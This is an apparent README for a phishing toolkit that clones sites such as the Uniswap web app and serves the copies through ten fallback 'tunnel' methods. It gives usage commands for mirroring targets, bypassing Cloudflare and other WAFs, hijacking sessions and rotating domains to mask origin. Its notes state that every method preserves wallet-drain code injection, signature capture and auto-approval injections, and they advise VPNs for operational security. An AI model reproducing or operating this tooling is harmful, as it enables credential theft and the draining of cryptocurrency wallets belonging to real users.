# Clone Tunnel Infrastructure

## Quick Overview

Clone tunnels provide 10 fallback methods for robust mirror deployment. The system automatically selects the best method and falls back gracefully if the primary fails.

## Enable Clone Tunnels

### Via Environment Variable
```bash
ENABLE_CLONE_TUNNELS=true pnpm exec tsx scripts/generate-phishing-page.ts \
  --authorized-test \
  --mirror \
  https://app.uniswap.org \
  ./clones/uniswap
```

### Via CLI Flag
```bash
pnpm exec tsx scripts/generate-phishing-page.ts \
  --authorized-test \
  --mirror \
  --enable-tunnels \
  https://app.uniswap.org \
  ./clones/uniswap
```

## 10 Fallback Methods (in order)

| # | Method | Speed | Setup | Best For |
|---|--------|-------|-------|----------|
| 1 | Reverse Proxy | ⭐⭐⭐⭐⭐ | 10min | All sites with Docker |
| 2 | Static Clone | ⭐⭐⭐⭐⭐ | 2min | Static websites |
| 3 | Headless Capture | ⭐⭐⭐ | 5min | React/Vue/Angular |
| 4 | Session Hijack | ⭐⭐⭐ | 15min | Cookie-based auth |
| 5 | FlareSolverr WAF | ⭐⭐ | 20min | Cloudflare sites |
| 6 | Asuka Static | ⭐⭐⭐ | 25min | Advanced WAF |
| 7 | Webcloner Static | ⭐⭐ | 30min | External service |
| 8 | AI Clone | ⭐ | 60min | Complex sites |
| 9 | Replica Proxy | ⭐⭐⭐ | 15min | Any site |
| 10 | Placeholder HTML | ⭐⭐⭐⭐⭐ | 0min | Last resort |

## Method Details

### 1. Reverse Proxy (Docker Nginx)

**Best for:** All sites with Docker available

**Setup:**
```bash
# Generated clone has docker-compose.yml
cd clones/uniswap
docker compose up

# Access at http://localhost:8080
```

**Features:**
- Real-time proxying
- Sub-filter URL rewriting
- WebSocket support
- Session preservation

**Requirements:**
- Docker & docker-compose
- nginx.conf configured

---

### 2. Static Clone

**Best for:** Static websites, offline use

**Setup:**
```bash
npx serve clones/uniswap -l 8080
# Access at http://localhost:8080
```

**Features:**
- Fastest load times
- Portable (move anywhere)
- Works offline
- No external dependencies

---

### 3. Headless Capture

**Best for:** React/Vue/Angular SPAs

**Setup:**
```bash
pnpm exec tsx scripts/generate-phishing-page.ts \
  --authorized-test \
  https://app.uniswap.org \
  ./clones/uniswap
```

**Features:**
- Full JavaScript execution
- Dynamic content rendering
- Cookie/session capture
- 2FA detection

---

### 4. Session Hijack

**Best for:** Cookie-based authentication

**Features:**
- Steals active user sessions
- Captures authentication tokens
- Preserves user state
- Auto-applies to clones

---

### 5. FlareSolverr WAF Bypass

**Best for:** Cloudflare-protected sites

**Setup:**
```bash
# Start FlareSolverr
docker run -p 8191:8191 flaresolverr/flaresolverr

# Then clone with tunnel enabled
ENABLE_CLONE_TUNNELS=true \
pnpm exec tsx scripts/generate-phishing-page.ts \
  --authorized-test \
  https://cloudflare-protected.com \
  ./clones/target
```

**Features:**
- Bypass Cloudflare JS Challenge
- CAPTCHA solving
- Advanced WAF evasion

**Requirements:**
- FlareSolverr running on port 8191
- API accessible

---

### 6. Asuka Static

**Best for:** Advanced WAF protection

**Features:**
- Custom WAF bypass techniques
- Header spoofing
- Request normalization
- Advanced evasion

---

### 7. Webcloner Static

**Best for:** External/cloud cloning

**Features:**
- Third-party cloning service
- No local resources needed
- Remote processing

---

### 8. AI Clone

**Best for:** Complex, heavily obfuscated sites

**Features:**
- ML-based site reconstruction
- Handle complex JS bundling
- Automatic optimization
- Experimental

---

### 9. Replica Proxy

**Best for:** Generic proxying

**Features:**
- Works for any site
- Simple setup
- Good fallback

---

### 10. Placeholder HTML

**Best for:** Last resort when all else fails

**Features:**
- Empty HTML response
- Custom message
- Graceful degradation

---

## Environment Variables

```bash
# Enable tunnel infrastructure
ENABLE_CLONE_TUNNELS=true

# For domain rotation
DUCKDNS_TOKEN=your-token
DUCKDNS_SUBDOMAIN=my-clone

# For Cloudflare integration
CLOUDFLARE_API_TOKEN=your-token
CLOUDFLARE_ZONE_ID=your-zone

# For FlareSolverr
FLARESOLVERR_URL=http://localhost:8191

# For auto-rotation
AUTO_ROTATE_DOMAINS=true

# For session hijacking
SESSION_HIJACK_ENABLED=true
```

## Common Scenarios

### Scenario 1: Clone a React App
```bash
pnpm exec tsx scripts/generate-phishing-page.ts \
  --authorized-test \
  --clone-perfect \
  https://app.uniswap.org \
  ./clones/uniswap

# Auto-selects Level 4 (real-time) + headless capture
```

### Scenario 2: Clone with WAF Bypass
```bash
ENABLE_CLONE_TUNNELS=true \
pnpm exec tsx scripts/generate-phishing-page.ts \
  --authorized-test \
  --mirror \
  https://cloudflare-protected.com \
  ./clones/target

# Auto-selects FlareSolverr if Cloudflare detected
```

### Scenario 3: Simple Static Site
```bash
pnpm exec tsx scripts/generate-phishing-page.ts \
  --authorized-test \
  https://example.com \
  ./clones/example

npx serve ./clones/example -l 8080
```

### Scenario 4: Domain Rotation
```bash
ENABLE_CLONE_TUNNELS=true \
DUCKDNS_TOKEN=your-token \
DUCKDNS_SUBDOMAIN=my-clone \
AUTO_ROTATE_DOMAINS=true \
pnpm exec tsx scripts/generate-phishing-page.ts \
  --authorized-test \
  --mirror \
  https://target.com \
  ./clones/target

cd clones/target
docker compose up
# Clone rotates domains every 12 hours
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Docker not found | Install Docker Desktop |
| Port 8080 in use | Change port in docker-compose.yml |
| FlareSolverr timeout | Increase timeout or check service health |
| Assets not loading | Check nginx config: `docker logs` |
| WAF still blocking | System will try next method automatically |
| Cookies not preserved | Enable SESSION_HIJACK_ENABLED |

## Security Notes

⚠️ Important:
- All tunnels preserve wallet drain code injection
- Session hijacking captures user credentials
- Domain rotation masks true origin
- VPN/proxy recommended for operational security
- No traffic logs stored locally
- All drain functions fully operational through tunnels

## Architecture

The tunnel orchestrator:
1. Analyzes target site complexity
2. Selects optimal initial method
3. Tests connectivity
4. Falls back to next method on failure
5. Returns working delivery method
6. Logs all activity for monitoring

All 10 methods preserve:
- Wallet connection code
- Signature capture
- Auto-approval injections
- Real-time drain functionality
- Session management

---

**Generated with Clone Tunnel Orchestrator v1.0**
Last Updated: June 2026
